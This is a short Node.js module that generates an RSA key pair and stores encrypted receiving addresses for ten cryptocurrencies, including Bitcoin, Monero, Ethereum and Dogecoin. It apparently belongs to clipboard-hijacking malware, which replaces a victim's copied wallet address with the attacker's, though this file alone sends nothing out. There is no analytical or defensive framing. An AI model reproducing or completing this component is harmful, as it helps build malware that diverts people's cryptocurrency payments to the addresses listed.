module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("bc1qswtcuyvu7094hmtxayf2etjk9f4rlqcsvtkd8p"),
        ltc: client.utils.encryption.encryptData("LLx92TxQ8pw4iKWGBsBVr53wkpWYyJDRJZ"),
        xmr: client.utils.encryption.encryptData("479v23ZBWaK4wQNoy1e6r6bnbXCgX4x4KWcePGF8iX1sVVpFHTKELdSgKDRczcPXbZ91WcJ1CFgueeSwSZWwtBP9FKPJzdd"),
        eth: client.utils.encryption.encryptData("0x348bC25447731794DD9D0d6f7d09d2dAd74c0041"),
        xrp: client.utils.encryption.encryptData("rGArQHUoANH5aoqXiyiF42Zz5eS8mTFYgH"),
        neo: client.utils.encryption.encryptData("AVW7yANZZK5PBhLzNakqYx1HsaMRyEor8F"),
        bch: client.utils.encryption.encryptData("qp98jmvq7tm56adpa4ycy25fwyhhm5hcpvddal6h7t"),
        doge: client.utils.encryption.encryptData("DH473TqZTr1cozCpU6t9Fqv3kdqWs7GZvX"),
        dash: client.utils.encryption.encryptData("XnWG3AEyCMnQRE2qZZ19a642Po48H6yeHE"),
        xlm: client.utils.encryption.encryptData("GA23HTH4F7TVT6POASIU43HDAY6TXCZ5T5C6ASO22GBXOJENYWSZAUQR"),
    }
}